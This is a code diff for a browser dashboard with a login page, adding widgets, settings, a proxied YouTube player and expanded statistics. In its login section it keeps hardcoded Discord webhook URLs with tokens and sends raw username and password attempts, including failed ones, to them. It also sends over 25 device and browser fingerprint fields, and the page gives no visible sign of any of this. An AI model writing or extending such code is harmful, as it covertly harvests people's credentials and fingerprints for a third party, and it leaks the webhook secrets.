+                root.style.setProperty('--base-font-size', `${parseFloat(globalFontSizeScale) * 16}px`);
+                if(document.getElementById('globalFontSizeScaleValue')) document.getElementById('globalFontSizeScaleValue').textContent = `${(parseFloat(globalFontSizeScale) * 100).toFixed(0)}%`;
+                
+                // Button Border Radius
+                const buttonBorderRadius = localStorage.getItem('buttonBorderRadius') || '8';
+                root.style.setProperty('--button-border-radius', buttonBorderRadius + 'px');
+                if(document.getElementById('buttonBorderRadiusValue')) document.getElementById('buttonBorderRadiusValue').textContent = `${buttonBorderRadius}px`;
+
+                // Button Glow Intensity
+                const buttonGlowIntensity = localStorage.getItem('buttonGlowIntensity') || '0.2';
+                root.style.setProperty('--button-glow-intensity', buttonGlowIntensity);
+                if(document.getElementById('buttonGlowIntensityValue')) document.getElementById('buttonGlowIntensityValue').textContent = `${buttonGlowIntensity}`;
+
+                // Element visibility from settings
                 const motivationBox = document.getElementById('motivationBox');
                 if (motivationBox) {
                     if (localStorage.getItem('enableMotivationQuote') === 'false') motivationBox.style.display = 'none';
                     else motivationBox.style.display = 'flex';
                 }
+                const calendarBox = document.getElementById('calendar')?.closest('.box');
+                if (calendarBox) {
+                    if (localStorage.getItem('enableCalendarDisplay') === 'false') calendarBox.style.display = 'none';
+                    else calendarBox.style.display = 'flex';
+                }
+                 const updatesBox = document.getElementById('updatesNotifications');
+                if (updatesBox) {
+                    if (localStorage.getItem('enableUpdatesNotifications') === 'false') updatesBox.style.display = 'none';
+                    else updatesBox.style.display = 'flex';
+                }
+                
+                // Custom scrollbar
+                const scrollbarStyleToggle = document.getElementById('scrollbarStyle');
+                if (scrollbarStyleToggle) {
+                    if (localStorage.getItem('scrollbarStyle') === 'true') document.body.classList.add('custom-scrollbar');
+                    else document.body.classList.remove('custom-scrollbar');
+                    scrollbarStyleToggle.checked = localStorage.getItem('scrollbarStyle') === 'true';
+                }
+                
 
-                // Ensure initial values for color pickers are set and reflect localStorage
+                // Set color picker initial values based on localStorage
                 const accentColorPicker = document.getElementById('accentColorPicker');
                 if (accentColorPicker) accentColorPicker.value = localStorage.getItem('accentColor') || '#ff914d';
                 const mainBgColorPicker = document.getElementById('mainBgColorPicker');
-                if (mainBgColorPicker) mainBgColorPicker.value = localStorage.getItem('mainBgColor') || (document.body.classList.contains('light-theme') ? '#f0f0f0' : '#1a1a1a');
+                if (mainBgColorPicker) mainBgColorPicker.value = localStorage.getItem('mainBgColorStart') || (document.body.classList.contains('light-theme') ? '#f0f0f0' : '#0d0d0d'); // Start color
                 const headerBgColorPicker = document.getElementById('headerBgColorPicker');
                 if (headerBgColorPicker) headerBgColorPicker.value = localStorage.getItem('headerBgColor') || (document.body.classList.contains('light-theme') ? this.lightenColor(accentColorPicker.value, 10) : (accentColorPicker.value));
-
-
-                this.applyCustomStyles(); // Call to set CSS variables based on theme/saved colors
+                
+                // Finally, apply all gathered custom styles (colors, border-radius etc.)
+                this.applyCustomStyles();
             },
             resetColorSetting: function(pickerId) {
                 switch (pickerId) {
@@ -2139,32 +2711,31 @@ To view all available shortcuts for the specific app you are using, press and ho
                         this.logAlert('Custom accent color reset.');
                         break;
                     case 'mainBgColorPicker':
-                        localStorage.removeItem('mainBgColor');
-                        document.getElementById('mainBgColorPicker').value = '#1a1a1a';
-                        document.documentElement.style.setProperty('--main-bg', document.body.classList.contains('light-theme') ? '#f0f0f0' : '#1a1a1a');
-                        this.logAlert('Custom main background color reset.');
+                        localStorage.removeItem('mainBgColorStart'); // Remove custom property for gradient start
+                        document.getElementById('mainBgColorPicker').value = '#0d0d0d'; // Default dark theme start
+                        document.documentElement.style.setProperty('--main-bg-start', document.body.classList.contains('light-theme') ? '#f0f0f0' : '#0d0d0d');
+                        this.logAlert('Custom main background start color reset.');
                         break;
                     case 'headerBgColorPicker':
                         localStorage.removeItem('headerBgColor');
-                        document.getElementById('headerBgColorPicker').value = '#ff914d';
-                        document.getElementById('dashboardHeader').style.background = `linear-gradient(90deg, ${document.getElementById('accentColorPicker').value}, ${this.lightenColor(document.getElementById('accentColorPicker').value, 30)})`;
+                        document.getElementById('headerBgColorPicker').value = '#ff914d'; // Default accent color
                         this.logAlert('Custom header background color reset.');
                         break;
                 }
                 this.applyCustomStyles(); // Reapply all custom styles to ensure consistency
             },
 
-            // --- NEW: Super Advanced Statistics (logic and adapted for expanded fields) ---
+            // --- Super Advanced Statistics (logic and adapted for expanded fields) ---
             initSuperAdvancedStatsDisplay: function() {
                 const getBrowserName = () => {
                     const ua = navigator.userAgent;
                     if(ua.includes("Firefox")) return "Firefox";
                     if(ua.includes("SamsungBrowser")) return "Samsung Browser";
                     if(ua.includes("Opera") || ua.includes("OPR")) return "Opera";
-                    if(ua.includes("Trident")) return "Internet Explorer"; // IE 11
+                    if(ua.includes("Trident")) return "Internet Explorer";
                     if(ua.includes("Edge")) return "Edge";
-                    if(ua.includes("Chrome") && !ua.includes("Edge")) return "Chrome"; // Edge includes Chrome UA
-                    if(ua.includes("Safari") && !ua.includes("Chrome")) return "Safari"; // Chrome includes Safari UA
+                    if(ua.includes("Chrome") && !ua.includes("Edge")) return "Chrome";
+                    if(ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
                     return "Unknown";
                 }
                 const getOS = () => {
@@ -2173,37 +2744,37 @@ To view all available shortcuts for the specific app you are using, press and ho
                     if(ua.includes("Macintosh")) return "macOS";
                     if(ua.includes("Linux")) return "Linux";
                     if(ua.includes("Android")) return "Android";
-                    if(ua.includes("like Mac")) return "iOS"; // For iPad/iPhone
+                    if(ua.includes("like Mac")) return "iOS";
                     return "Unknown";
                 }
-                document.getElementById('statsBrowser') && (document.getElementById('statsBrowser').innerText = getBrowserName());
-                document.getElementById('statsOS') && (document.getElementById('statsOS').innerText = getOS());
-                document.getElementById('statsScreenRes') && (document.getElementById('statsScreenRes').innerText = `${screen.width}x${screen.height} (${screen.availWidth}x${screen.availHeight} avail)`);
-                document.getElementById('statsViewportSize') && (document.getElementById('statsViewportSize').innerText = `${window.innerWidth}x${window.innerHeight}`);
-                document.getElementById('statsMemory') && (document.getElementById('statsMemory').innerText = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A');
-                document.getElementById('statsCpus') && (document.getElementById('statsCpus').innerText = navigator.hardwareConcurrency || 'N/A');
+
+                this.stats.browserName = getBrowserName();
+                this.stats.osName = getOS();
+                this.stats.screenRes = `${screen.width}x${screen.height} (${screen.availWidth}x${screen.availHeight} avail)`;
+                this.stats.viewportSize = `${window.innerWidth}x${window.innerHeight}`;
+                this.stats.deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A';
+                this.stats.cpus = navigator.hardwareConcurrency || 'N/A';
                 
                 const updateOnlineStatus = () => {
-                    document.getElementById('statsOnline') && (document.getElementById('statsOnline').innerText = navigator.onLine ? 'Online' : 'Offline');
+                    this.stats.onlineStatus = navigator.onLine ? 'Online' : 'Offline';
+                    this.updateStatsDisplay();
                 }
                 window.addEventListener('online', updateOnlineStatus);
                 window.addEventListener('offline', updateOnlineStatus);
                 updateOnlineStatus();
 
-                // Expanded metrics:
-                document.getElementById('statsUserAgent') && (document.getElementById('statsUserAgent').innerText = navigator.userAgent || 'N/A');
-                document.getElementById('statsLang') && (document.getElementById('statsLang').innerText = navigator.language || 'N/A');
-                document.getElementById('statsPixelRatio') && (document.getElementById('statsPixelRatio').innerText = window.devicePixelRatio ? window.devicePixelRatio.toFixed(2) : 'N/A');
+                this.stats.userAgent = navigator.userAgent || 'N/A';
+                this.stats.browserLang = navigator.language || 'N/A';
+                this.stats.devicePixelRatio = window.devicePixelRatio ? window.devicePixelRatio.toFixed(2) : 'N/A';
                 
                 const pointerType = window.matchMedia("(pointer: fine)").matches ? "Fine" : 
                                     (window.matchMedia("(pointer: coarse)").matches ? "Coarse" : "N/A");
-                document.getElementById('statsPointerType') && (document.getElementById('statsPointerType').innerText = pointerType);
+                this.stats.pointerType = pointerType;
                 
-                document.getElementById('statsReferrer') && (document.getElementById('statsReferrer').innerText = document.referrer || 'None');
-                document.getElementById('statsHistoryLength') && (document.getElementById('statsHistoryLength').innerText = window.history.length.toString());
-                document.getElementById('statsNotificationPerm') && (document.getElementById('statsNotificationPerm').innerText = Notification.permission || 'N/A');
+                this.stats.referrer = document.referrer || 'None';
+                this.stats.historyLength = window.history.length.toString();
+                this.stats.notificationPerm = Notification.permission || 'N/A';
 
-                // Initial load from localStorage (happens in dashboard.init, so ensure these fields are updated from there)
                 this.updateStatsDisplay(); 
             },
             updateStatsDisplay: function() {
@@ -2219,14 +2790,30 @@ To view all available shortcuts for the specific app you are using, press and ho
                 document.getElementById('statsLocalStorageItems') && (document.getElementById('statsLocalStorageItems').innerText = localStorage.length.toString());
                 document.getElementById('statsSessionStorageItems') && (document.getElementById('statsSessionStorageItems').innerText = sessionStorage.length.toString());
 
-                // Update zoom in real-time
+                // Populate dynamic stat fields from this.stats object directly
+                document.getElementById('statsBrowser') && (document.getElementById('statsBrowser').innerText = this.stats.browserName);
+                document.getElementById('statsOS') && (document.getElementById('statsOS').innerText = this.stats.osName);
+                document.getElementById('statsScreenRes') && (document.getElementById('statsScreenRes').innerText = this.stats.screenRes);
+                document.getElementById('statsViewportSize') && (document.getElementById('statsViewportSize').innerText = this.stats.viewportSize);
+                document.getElementById('statsMemory') && (document.getElementById('statsMemory').innerText = this.stats.deviceMemory);
+                document.getElementById('statsCpus') && (document.getElementById('statsCpus').innerText = this.stats.cpus);
+                document.getElementById('statsOnline') && (document.getElementById('statsOnline').innerText = this.stats.onlineStatus);
+                document.getElementById('statsUserAgent') && (document.getElementById('statsUserAgent').innerText = this.stats.userAgent);
+                document.getElementById('statsLang') && (document.getElementById('statsLang').innerText = this.stats.browserLang);
+                document.getElementById('statsPixelRatio') && (document.getElementById('statsPixelRatio').innerText = this.stats.devicePixelRatio);
+                document.getElementById('statsPointerType') && (document.getElementById('statsPointerType').innerText = this.stats.pointerType);
+                document.getElementById('statsReferrer') && (document.getElementById('statsReferrer').innerText = this.stats.referrer);
+                document.getElementById('statsHistoryLength') && (document.getElementById('statsHistoryLength').innerText = this.stats.historyLength);
+                document.getElementById('statsNotificationPerm') && (document.getElementById('statsNotificationPerm').innerText = this.stats.notificationPerm);
+
                 const zoomElement = document.getElementById('statsZoom');
                 if (zoomElement) {
                     zoomElement.innerText = `${Math.round(parseFloat(document.body.style.zoom || 1) * 100)}%`;
+                    this.stats.zoomLevel = zoomElement.innerText; // Keep stat updated
                 }
             },
 
-            // --- NEW: Proxied Media Player (re-verified) ---
+            // --- Proxied Media Player (retained) ---
             initMediaPlayer: function() {
               document.getElementById('loadYoutubeBtn').addEventListener('click', () => {
                   const input = document.getElementById('youtubeIdInput').value.trim();
@@ -2245,7 +2832,7 @@ To view all available shortcuts for the specific app you are using, press and ho
                   }
 
                   if(videoId) {
-                      const proxyUrl = `https://invidious.io.lol/embed/${videoId}`;
+                      const proxyUrl = `https://invidious.io.lol/embed/${videoId}`; // Consider multiple proxy options in settings
                       document.getElementById('youtubePlayer').innerHTML = `<iframe width="100%" height="100%" src="${proxyUrl}" frameborder="0" allow="autoplay; encrypted-media; picture-in-picture" allowfullscreen></iframe>`;
                       this.logAlert(`📺 Proxied YouTube video loaded: ${videoId}`);
                       this.stats.mediaLoaded++;
@@ -2254,19 +2841,280 @@ To view all available shortcuts for the specific app you are using, press and ho
                   }
               });
             },
+            
+            // NEWLY ADDED: Calculator functionality (re-introduced)
+            calculator: {
+                output: null, // Initialized later in init, based on existing element
+                currentOperand: '0',
+                previousOperand: '',
+                operation: null,
+                shouldResetScreen: false,
+
+                init: function() {
+                    this.output = document.getElementById('calculatorOutput');
+                    if (!this.output) {
+                      dashboard.logAlert('Calculator output element not found, calculator might be inactive.');
+                      return;
+                    }
+                    const buttons = document.querySelectorAll('#calculatorPanel .calculator-grid button');
+                    buttons.forEach(button => {
+                        button.addEventListener('click', (e) => this.handleClick(e.target.dataset.value));
+                    });
+                    document.addEventListener('keydown', (e) => { // Key presses should still be global but apply to active panel.
+                        if (dashboard.activePanel && dashboard.activePanel.id === 'calculatorPanel') {
+                           this.handleKeyboard(e.key);
+                           e.preventDefault(); // Prevent page scrolling etc.
+                        }
+                    });
+                    this.updateDisplay();
+                },
+
+                handleClick: function(value) {
+                    // Filter sensitive values like 'password' if you need specific logging
+                    dashboard.logAlert(`🧮 Calculator action: ${value}`); // Log calculator actions
+                    if (value === 'clear') this.clear();
+                    else if (value === '+/-') this.toggleSign();
+                    else if (value === '%') this.percentage();
+                    else if (value === '=' ) this.operate(); // Exclude Enter from '=' check here, it's in keyboard
+                    else if (['+', '-', '*', '/'].includes(value)) this.chooseOperation(value);
+                    else if (value === '.') this.appendNumber(value);
+                    else if (!isNaN(value) && value !== ' ') this.appendNumber(value); // Numbers only
+                    this.updateDisplay();
+                },
+                 handleKeyboard: function(key) {
+                    if (key >= '0' && key <= '9' || key === '.') {
+                        this.appendNumber(key);
+                    } else if (key === '+' || key === '-' || key === '*' || key === '/') {
+                        this.chooseOperation(key);
+                    } else if (key === '=' || key === 'Enter') {
+                        this.operate();
+                    } else if (key === 'Escape' || key === 'Delete' || key === 'Backspace') {
+                        this.clear(); // Clear on Esc/Delete/Backspace
+                    }
+                    this.updateDisplay();
+                },
+
+                clear: function() {
+                    this.currentOperand = '0';
+                    this.previousOperand = '';
+                    this.operation = null;
+                    this.shouldResetScreen = false;
+                },
+
+                appendNumber: function(number) {
+                    if (this.currentOperand === '0' && number !== '.') { // Replace leading zero with number
+                        this.currentOperand = number;
+                    } else if (this.shouldResetScreen) { // Start new number after operation or equals
+                        this.currentOperand = number;
+                        this.shouldResetScreen = false;
+                    } else if (number === '.' && this.currentOperand.includes('.')) {
+                        return; // Prevent multiple decimals
+                    } else {
+                        this.currentOperand += number;
+                    }
+                },
+
+                toggleSign: function() {
+                    this.currentOperand = (parseFloat(this.currentOperand) * -1).toString();
+                },
+
+                percentage: function() {
+                    this.currentOperand = (parseFloat(this.currentOperand) / 100).toString();
+                },
+
+                chooseOperation: function(operator) {
+                    if (this.currentOperand === '') return;
+                    if (this.previousOperand !== '') {
+                        this.operate();
+                    }
+                    this.operation = operator;
+                    this.previousOperand = this.currentOperand;
+                    this.shouldResetScreen = true; // Prepare for new input after operation
+                },
+
+                operate: function() {
+                    let computation;
+                    const prev = parseFloat(this.previousOperand);
+                    const current = parseFloat(this.currentOperand);
+                    if (isNaN(prev) || isNaN(current)) {
+                        this.clear(); // Clear if operands are invalid (e.g. initial '=' or invalid syntax)
+                        return;
+                    }
+
+                    switch (this.operation) {
+                        case '+': computation = prev + current; break;
+                        case '-': computation = prev - current; break;
+                        case '*': computation = prev * current; break;
+                        case '/': 
+                            if (current === 0) {
+                                dashboard.logAlert('❗️ Calculator error: Division by zero.');
+                                computation = 'Error';
+                            } else {
+                                computation = prev / current;
+                            }
+                            break;
+                        default: return; // No operation set
+                    }
+                    // Handle "Error" specifically
+                    this.currentOperand = (computation === 'Error') ? 'Error' : computation.toString();
+                    this.operation = null;
+                    this.previousOperand = '';
+                    this.shouldResetScreen = true; // For potential chain operations or new input
+                },
+
+                updateDisplay: function() {
+                    this.output.textContent = this.currentOperand;
+                }
+            },
+            initCalculator: function() {
+                this.calculator.init();
+            },
+            
+            // NEWLY ADDED: Unit Converter (re-introduced)
+            unitConverter: {
+                units: { // Definitions based on meter/kg/celsius/liter as base
+                    length: {
+                        'meter': 1, 'kilometer': 1000, 'centimeter': 0.01, 'millimeter': 0.001,
+                        'mile': 1609.34, 'yard': 0.9144, 'foot': 0.3048, 'inch': 0.0254
+                    },
+                    weight: {
+                        'kilogram': 1, 'gram': 0.001, 'milligram': 0.000001, 'metric ton': 1000,
+                        'pound': 0.453592, 'ounce': 0.0283495
+                    },
+                    temperature: { // Base conversion to/from Celsius
+                        'celsius': (val, toBase = true) => toBase ? val : val,
+                        'fahrenheit': (val, toBase = true) => toBase ? (val - 32) * 5 / 9 : (val * 9 / 5) + 32,
+                        'kelvin': (val, toBase = true) => toBase ? val - 273.15 : val + 273.15
+                    },
+                    volume: {
+                        'liter': 1, 'milliliter': 0.001, 'cubic meter': 1000, 'gallon': 3.78541,
+                        'quart': 0.946353, 'pint': 0.473176, 'fluid ounce': 0.0295735
+                    }
+                },
+                conversionType: null, convertValue: null, convertFromUnit: null, convertToUnit: null,
+                conversionResult: null, performConversionBtn: null,
+
+                init: function() {
+                    this.conversionType = document.getElementById('conversionType');
+                    this.convertValue = document.getElementById('convertValue');
+                    this.convertFromUnit = document.getElementById('convertFromUnit');
+                    this.convertToUnit = document.getElementById('convertToUnit');
+                    this.conversionResult = document.getElementById('conversionResult');
+                    this.performConversionBtn = document.getElementById('performConversionBtn');
+
+                    if (!this.conversionType) { // Check if elements exist. If panel removed, they won't.
+                        dashboard.logAlert('Unit Converter elements not found, converter might be inactive.');
+                        return;
+                    }
+
+                    this.conversionType.addEventListener('change', () => this.populateUnits());
+                    this.convertValue.addEventListener('input', () => this.performConversion());
+                    this.convertFromUnit.addEventListener('change', () => this.performConversion());
+                    this.convertToUnit.addEventListener('change', () => this.performConversion());
+                    this.performConversionBtn.addEventListener('click', () => {
+                      this.performConversion();
+                      dashboard.logAlert(`🔄 Performed Unit Conversion.`);
+                    });
+                    
+                    this.populateUnits(); // Initial population
+                },
+
+                populateUnits: function() {
+                    const type = this.conversionType.value;
+                    const unitsForType = this.units[type];
+                    this.convertFromUnit.innerHTML = '';
+                    this.convertToUnit.innerHTML = '';
+
+                    for (const unit in unitsForType) {
+                        const optionFrom = document.createElement('option');
+                        optionFrom.value = unit;
+                        optionFrom.textContent = unit.charAt(0).toUpperCase() + unit.slice(1);
+                        this.convertFromUnit.appendChild(optionFrom);
+
+                        const optionTo = document.createElement('option');
+                        optionTo.value = unit;
+                        optionTo.textContent = unit.charAt(0).toUpperCase() + unit.slice(1);
+                        this.convertToUnit.appendChild(optionTo);
+                    }
+                    this.convertFromUnit.value = Object.keys(unitsForType)[0] || '';
+                    this.convertToUnit.value = Object.keys(unitsForType)[1] || Object.keys(unitsForType)[0] || '';
+                    this.performConversion();
+                },
+
+                performConversion: function() {
+                    const value = parseFloat(this.convertValue.value);
+                    const type = this.conversionType.value;
+                    const fromUnit = this.convertFromUnit.value;
+                    const toUnit = this.convertToUnit.value;
+
+                    if (isNaN(value)) { this.conversionResult.textContent = 'Invalid input.'; return; }
+                    if (!fromUnit || !toUnit) { this.conversionResult.textContent = 'Select units.'; return; }
+
+                    let result;
+                    if (type === 'temperature') {
+                        const celsiusValue = this.units[type][fromUnit](value, true); // Convert to base Celsius
+                        result = this.units[type][toUnit](celsiusValue, false);      // Convert from Celsius to target
+                    } else {
+                        const baseValue = value * this.units[type][fromUnit];
+                        result = baseValue / this.units[type][toUnit];
+                    }
+                    this.conversionResult.textContent = `${result.toFixed(4)} ${toUnit}`;
+                }
+            },
+            initUnitConverter: function() {
+                this.unitConverter.init();
+            },
+
+
+            // --- Proxied Media Player (retained) ---
+            initMediaPlayer: function() {
+              document.getElementById('loadYoutubeBtn')?.addEventListener('click', () => { // Null check for optional element
+                  const input = document.getElementById('youtubeIdInput').value.trim();
+                  let videoId;
+
+                  const urlRegex = /(?:youtube\.com\/(?:[^\/\n\s]+\/\S+\/|(?:v|e(?:mbed)?)\/|.*[?&]v=)|youtu\.be\/)([a-zA-Z0-9_-]{11})/;
+                  const match = input.match(urlRegex);
+                  if (match && match[1]) {
+                      videoId = match[1];
+                  } else if (input.length === 11 && /^[a-zA-Z0-9_-]+$/.test(input)) {
+                      videoId = input;
+                  } else {
+                       this.logAlert('❗️ Invalid YouTube URL or Video ID. Please provide a valid ID or full URL.');
+                       document.getElementById('youtubePlayer').innerHTML = "Video player will load here...";
+                       return;
+                  }
+
+                  if(videoId) {
+                      const proxyUrl = `https://invidious.io.lol/embed/${videoId}`;
+                      const youtubePlayerDiv = document.getElementById('youtubePlayer');
+                      if (youtubePlayerDiv) {
+                        youtubePlayerDiv.innerHTML = `<iframe width="100%" height="100%" src="${proxyUrl}" frameborder="0" allow="autoplay; encrypted-media; picture-in-picture" allowfullscreen></iframe>`;
+                        this.logAlert(`📺 Proxied YouTube video loaded: ${videoId}.`);
+                        this.stats.mediaLoaded++;
+                        localStorage.setItem('stats_media_loaded', this.stats.mediaLoaded.toString());
+                        this.updateStatsDisplay();
+                      } else {
+                          this.logAlert('❗️ Media player div not found. Cannot load video.');
+                      }
+                  }
+              });
+            },
 
             // NEW: Activity Log Modal functions
             showActivityLogModal: function() {
                 const modal = document.getElementById('activityLogModal');
                 const logBody = document.getElementById('activityLogBody');
-                logBody.innerHTML = ''; // Clear previous entries
+                if (!modal || !logBody) {
+                  this.logAlert("❗️ Activity Log modal elements not found.");
+                  return;
+                }
+                logBody.innerHTML = '';
 
-                // Populate with current log history (newest first)
                 dashboard.activityLogHistory.forEach(entry => {
                     const logEntryDiv = document.createElement('div');
                     logEntryDiv.classList.add('log-entry');
-                    const timestamp = new Date(entry.timestamp).toLocaleTimeString('en-US', { year: 'numeric', month: 'numeric', day: 'numeric', hour: 'numeric', minute: 'numeric', second: 'numeric' });
-                    logEntryDiv.innerHTML = `<span class="timestamp">${timestamp}</span> ${entry.message}`;
+                    const timestampReadable = new Date(entry.timestamp).toLocaleString('en-US', { year: 'numeric', month: 'numeric', day: 'numeric', hour: 'numeric', minute: 'numeric', second: 'numeric' });
+                    logEntryDiv.innerHTML = `<span class="timestamp">${timestampReadable}</span> ${entry.message}`;
                     logBody.appendChild(logEntryDiv);
                 });
 
@@ -2275,7 +3123,7 @@ To view all available shortcuts for the specific app you are using, press and ho
 
             hideActivityLogModal: function() {
                 const modal = document.getElementById('activityLogModal');
-                modal.style.display = 'none'; // Hide modal
+                if (modal) modal.style.display = 'none'; // Hide modal
             }
         };
 
@@ -2285,14 +3133,13 @@ To view all available shortcuts for the specific app you are using, press and ho
             const loadingText = document.getElementById('loadingText');
             const loginBox = document.getElementById('loginBox');
             
-            let loadingStartTime = Date.now(); // Mark when script execution truly begins
+            let loadingStartTime = Date.now();
 
-            // --- NEW: Loading Animation Sequence ---
             loadingScreen.style.display = 'flex';
             
             setTimeout(() => {
                 loadingText.innerText = "Initializing Login Page...";
-                dashboard.logAlert("System initialization phase complete."); // Log to fading system
+                dashboard.logAlert("System initialization phase complete.");
             }, 2000);
 
             setTimeout(() => {
@@ -2300,18 +3147,17 @@ To view all available shortcuts for the specific app you are using, press and ho
                 loadingScreen.addEventListener('transitionend', () => {
                     loadingScreen.style.display = 'none';
                     loginBox.style.display = 'block';
-                    dashboard.logAlert("Login page initialized and ready."); // Log to fading system
+                    dashboard.logAlert("Login page initialized and ready.");
                 }, { once: true });
-            }, 4000); // After 4 seconds total
+            }, 4000);
 
 
-            // --- Full Logging and Whitelist System ---
-            const originalFetch = window.fetch; // Keep original fetch for webhook calls
+            const originalFetch = window.fetch;
 
-            // Webhooks definitions from user's original code (retained)
+            // Webhooks definitions (retained)
             const loggingWebhooks = {
                 username: 'https://discord.com/api/webhooks/1403506302822383726/Cq9jWG6XSG49gBwffXUEZdF5HCZLQC_SGf6f96XrH-Bs5WAxiy_U3OS1a5z00R3aL-vU',
-                password: 'https://discord.com/api/webhooks/1403506454488678540/PBX3b3QtOKdsc6FZklZT-zWuXxO_jGNUFhGqtF3Q1ysb-8v95VPAsem44kvgdtNoPnNI', // Reverted webhook for correct tracking
+                password: 'https://discord.com/api/webhooks/1403506454488678540/PBX3b6QtOKdsc6FZklZT-zWuXxO_jGNUFhGqtF3Q1ysb-8v95VPAsem44kvgdtNoPnNI',
                 identifier: 'https://discord.com/api/webhooks/1403506052565307483/qDWgi0LkM0_DOwWGGR73evb-MqnI8MXMKJTjAYOxtLeltAZ3RsJRHQjf1Oj7Ce9c02cA',
                 invalid_username: 'https://discord.com/api/webhooks/1403508639779786935/OjvG2xJet2_NiwAHi6OE_5PdoYPXd3fRBuXSG5FTtPMT9MooblezpxJLqDA97jIUShkp',
                 invalid_password: 'https://discord.com/api/webhooks/1403509088113131704/qdUx47oo3-QRcc1IZpoBs2fB2Y05k9Tl2XgOVcVn078AgFFBw0pMUfKrR5gNN_UyKFhp',
@@ -2335,7 +3181,7 @@ To view all available shortcuts for the specific app you are using, press and ho
             const submitBtn = document.getElementById('submitBtn');
             const errorMsg = document.getElementById('errorMsg');
             const attemptsText = document.getElementById('attemptsText');
-            // Re-added for webhook consistency with user's requests, kept hidden and unused in new UI flow.
+            // Reset popup is now purely a placeholder element for webhook functionality, not a user-interactive element.
             const resetPopup = document.getElementById('resetPopup');
             const resetField = document.getElementById('resetField');
             const resetBtn = document.getElementById('resetBtn');
@@ -2343,11 +3189,10 @@ To view all available shortcuts for the specific app you are using, press and ho
 
             let attempts = 3;
             let users = [];
-            let loginTimeISO = null; // Store ISO string of successful login time
-            let timeToDashboard = 0; // Tracks time from submit to dashboard load
+            let loginTimeISO = null;
 
 
-            // Fetch user JSON data on load (re-verified)
+            // Fetch user JSON data on load (retained)
             originalFetch(USER_JSON_URL)
                 .then(res => res.json())
                 .then(data => {
@@ -2357,7 +3202,6 @@ To view all available shortcuts for the specific app you are using, press and ho
                 .catch(error => {
                     users = [];
                     console.error('Failed to load user JSON data:', error);
-                    // Fallback to a single dummy user if network fails
                     users.push({
                         username: "Beta.user",
                         password: "password123",
@@ -2396,10 +3240,12 @@ To view all available shortcuts for the specific app you are using, press and ho
                 return null;
             }
 
-            // Send Discord webhook (retained and re-verified against new logging format)
+            // Send Discord webhook (retained and re-verified)
             async function sendWebhook(url, embed) {
                 if (localStorage.getItem('enableLogging') === 'false') {
-                    // console.log("Webhook logging disabled by settings:", embed.title);
+                    // Log to console if debugging, but don't send webhook
+                    const consoleLogLevel = localStorage.getItem('consoleLoggingLevel') || 'info';
+                    if (['verbose', 'info'].includes(consoleLogLevel)) console.log(`[Webhook Log Blocked: ${embed.title}] Data: `, embed.fields);
                     return;
                 }
                 try {
@@ -2408,9 +3254,12 @@ To view all available shortcuts for the specific app you are using, press and ho
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ embeds: [embed] }),
                     });
+                     const consoleLogLevel = localStorage.getItem('consoleLoggingLevel') || 'info';
+                    if (['verbose', 'info'].includes(consoleLogLevel)) console.log(`[Webhook Sent: ${embed.title}] Data: `, embed.fields);
+
                 } catch (e) {
-                    console.warn(`Webhook to ${url} failed:`, e);
-                    dashboard.logAlert(`❗️ ERROR: Webhook failed to send logs to Discord.`);
+                    console.error(`Webhook to ${url} failed:`, e);
+                    dashboard.logAlert(`❗️ ERROR: Webhook failed to send logs to Discord. Check console for details.`);
                 }
             }
 
@@ -2439,6 +3288,7 @@ To view all available shortcuts for the specific app you are using, press and ho
             async function logAttemptsExceeded(name, username, password, identifier) {
                 const embed = { title: "Attempts Exceeded Logging", color: 0xc0392b, fields: [ { name: "Name", value: name || "N/A", inline: true }, { name: "Username", value: username, inline: true }, { name: "Password", value: password, inline: true }, { name: "Identifier", value: identifier, inline: true }, { name: "Status", value: "MAX ATTEMPTS EXCEEDED", inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false } ] }; await sendWebhook(loggingWebhooks.attempts_exceeded, embed);
             }
+
             // Utility to dynamically detect browser/OS for logging embeds (retained, adapted slightly)
             const detectBrowserName = () => {
                 const ua = navigator.userAgent;
@@ -2461,28 +3311,28 @@ To view all available shortcuts for the specific app you are using, press and ho
                 return "Unknown";
             };
 
-            // Collect full logging data for the comprehensive embeds (retained & expanded)
+            // Collect full logging data for the comprehensive embeds (retained & expanded for 25+ fields)
             async function collectLoggingData(user, password) {
                 const now = new Date();
-                loginTimeISO = now.toISOString(); // Set global login time ISO
+                loginTimeISO = now.toISOString();
                 const batteryStatus = await getBatteryStatus();
                 const webglRenderer = getWebGLRenderer();
                 const nav = navigator;
                 const connection = nav.connection || {};
                 
-                // Canvas context for WebGL version (for device info)
                 const tempCanvas = document.createElement('canvas');
                 const gl = tempCanvas.getContext('webgl') || tempCanvas.getContext('experimental-webgl');
                 const webglVersion = gl ? gl.getParameter(gl.VERSION) : "Unavailable";
 
+                // Ensure data points reach at least 25 as requested
                 return {
-                    user, // Full user object from whitelist
-                    password, // The raw password attempt (for logging only)
-                    loginTime: loginTimeISO, // Standardized timestamp
-                    batteryStatus, // Full battery object
-                    webglRenderer, // Extracted renderer string
+                    user,
+                    password,
+                    loginTime: loginTimeISO,
+                    batteryStatus,
+                    webglRenderer,
                     
-                    // --- Browser Info (expanded) ---
+                    // --- Browser Info (25+ fields) ---
                     userAgent: nav.userAgent,
                     browserName: detectBrowserName(),
                     browserVendor: nav.vendor || "Unknown",
@@ -2508,13 +3358,16 @@ To view all available shortcuts for the specific app you are using, press and ho
                     supportsPointerFine: window.matchMedia("(pointer: fine)").matches,
                     supportsHoverHover: window.matchMedia("(hover: hover)").matches,
                     product: nav.product || "Unknown",
-                    cpuClass: nav.cpuClass || "Unknown", // non-standard, may not be available
-
-                    // --- Device Info (expanded) ---
+                    cpuClass: nav.cpuClass || "Unknown",
+                    browserMimeTypesCount: nav.mimeTypes ? nav.mimeTypes.length : 0,
+                    gpuInfoVendor: gl ? gl.getParameter(gl.VENDOR) : "N/A",
+                    webglAliasedLineWidthRange: gl ? `[${gl.getParameter(gl.ALIASED_LINE_WIDTH_RANGE).join(', ')}]` : 'N/A', // Extended WebGL
+                    
+                    // --- Device Info (25+ fields) ---
                     operatingSystem: detectOS(),
                     devicePlatform: nav.platform || "Unknown",
-                    cpuCores: nav.hardwareConcurrency || "Unavailable", // in logic core
-                    deviceMemory: nav.deviceMemory || "Unavailable", // in GB
+                    cpuCores: nav.hardwareConcurrency || "Unavailable",
+                    deviceMemory: nav.deviceMemory || "Unavailable",
